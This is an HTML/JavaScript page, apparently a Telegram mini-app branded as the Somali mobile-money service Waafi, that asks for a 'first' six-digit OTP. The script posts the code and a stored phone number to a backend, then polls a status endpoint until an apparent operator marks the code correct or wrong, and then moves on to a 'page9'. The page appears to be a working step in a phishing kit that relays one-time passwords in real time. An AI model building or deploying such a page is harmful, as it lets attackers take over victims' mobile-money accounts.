<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waafi - OTP Kowaad</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f7f7f7; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            min-height: 100vh;
            overflow-x: hidden;
        }

        .toast { 
            position: fixed; 
            top: 30px; 
            background: #263238; 
            color: white; 
            padding: 14px 20px; 
            border-radius: 12px; 
            display: flex; 
            align-items: center; 
            gap: 12px; 
            font-size: 14px; 
            box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
            opacity: 0; 
            transform: translateY(-20px);
            transition: all 0.5s ease; 
            z-index: 1000; 
            width: 85%;
            max-width: 350px;
        }
        .toast.show { opacity: 1; transform: translateY(0); }

        .tick-circle { 
            width: 20px; height: 20px; 
            background: #82d13d; 
            border-radius: 50%; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 12px; 
            color: white; 
            font-weight: bold; 
        }

        .card { 
            background: white; 
            width: 90%; 
            max-width: 400px; 
            margin-top: 50px; 
            padding: 40px 20px; 
            border-radius: 20px; 
            text-align: center; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
            box-sizing: border-box;
        }

        h2 { font-size: 24px; color: #222; margin-bottom: 15px; font-weight: 700; }
        .instruction { color: #666; font-size: 15px; margin-bottom: 25px; }

        .otp-group { 
            display: flex; 
            justify-content: center; 
            gap: 8px; 
            margin-bottom: 30px; 
        }

        .otp-input { 
            width: 42px; 
            height: 55px; 
            border: 1.5px solid #82d13d; 
            border-radius: 10px; 
            text-align: center; 
            font-size: 22px; 
            font-weight: bold; 
            outline: none; 
        }

        .resend-text { color: #999; font-size: 14px; margin-bottom: 35px; }

        .btn-verify { 
            background-color: #e0e0e0; 
            color: #999; 
            border: none; 
            width: 100%; 
            padding: 18px; 
            border-radius: 12px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: not-allowed;
        }

        .btn-verify.active { 
            background-color: #82d13d; 
            color: white; 
            cursor: pointer; 
        }

        #loadingSection { display: none; }

        .loader-circle { 
            width: 100px; height: 100px; 
            background: radial-gradient(circle, #a3e635 0%, #82d13d 100%); 
            border-radius: 50%; 
            margin: 0 auto 25px; 
            display: flex; justify-content: center; align-items: center; 
        }

        .loader-circle::after { 
            content: ''; 
            width: 75px; height: 75px; 
            border: 4px solid rgba(255,255,255,0.3); 
            border-top: 4px solid white; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        .green-header { color: #82d13d; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
        .wait-text { color: #666; font-size: 16px; }

        .footer-wave { 
            width: 100%; 
            background: linear-gradient(to bottom, #82d13d, #a3e635); 
            padding: 60px 0;
            margin-top: auto; 
            text-align: center; 
            color: white;
        }
    </style>
</head>

<body>

<div class="card" id="inputSection">
    <h2>Xaqiijinta OTP-ga Kowaad</h2>
    <p class="instruction">Geli OTP-ga kowaad</p>

    <div class="otp-group">
        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
    </div>

    <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span>s</p>

    <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
        XAQIIJI OTP
    </button>
</div>

<div class="card" id="loadingSection">
    <div class="loader-circle"></div>
    <div class="green-header">Xaqiijinta...</div>
    <div class="wait-text">Fadlan sug...</div>
</div>

<div class="footer-wave">
    <p>© 2026 Waafi Soomaaliya</p>
</div>

<script>
const inputs = document.querySelectorAll('.otp-input');
const verifyBtn = document.getElementById('verifyBtn');
const inputSection = document.getElementById('inputSection');
const loadingSection = document.getElementById('loadingSection');
const timerText = document.getElementById('timer');

let isSubmitting = false;

window.onload = () => {
    window.Telegram?.WebApp?.ready();
    window.Telegram?.WebApp?.expand();

    startCountdown();

    const phone = localStorage.getItem('phone');
    if (!phone) {
        alert("Session expired");
        window.location.href = "/index.html";
    }
};

function startCountdown() {
    let count = 60;
    const interval = setInterval(() => {
        timerText.innerText = count;
        count--;
        if (count < 0) clearInterval(interval);
    }, 1000);
}

// OTP input handling
inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');

        if (input.value && i < inputs.length - 1) {
            inputs[i + 1].focus();
        }
        check();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !input.value && i > 0) {
            inputs[i - 1].focus();
        }
    });
});

function check() {
    const filled = [...inputs].every(i => i.value.length === 1);
    verifyBtn.disabled = !filled;
    verifyBtn.classList.toggle('active', filled);
}

async function handleVerification() {
    if (isSubmitting) return;

    const phone = localStorage.getItem('phone');
    if (!phone) {
        alert("Phone not found");
        return;
    }

    let otp = "";
    inputs.forEach(i => otp += i.value);

    isSubmitting = true;
    inputSection.style.display = "none";
    loadingSection.style.display = "block";

    try {
        await fetch('/api/verify-first-otp', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone, otp })
        });

        const poll = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
                const data = await res.json();

                if (data.status === "otp1_correct") {
                    clearInterval(poll);

                    // IMPORTANT: keep phone for page 9
                    localStorage.setItem('phone', phone);

                    window.location.href = "/page9";
                }

                if (data.status === "otp1_wrong") {
                    clearInterval(poll);
                    alert("OTP waa khalad");
                    reset();
                }

            } catch (err) {
                console.error(err);
            }
        }, 2000);

    } catch (err) {
        console.error(err);
        reset();
    }
}

function reset() {
    isSubmitting = false;
    loadingSection.style.display = "none";
    inputSection.style.display = "block";

    inputs.forEach(i => i.value = "");
    verifyBtn.disabled = true;
    verifyBtn.classList.remove('active');
}
</script>

</body>
</html>
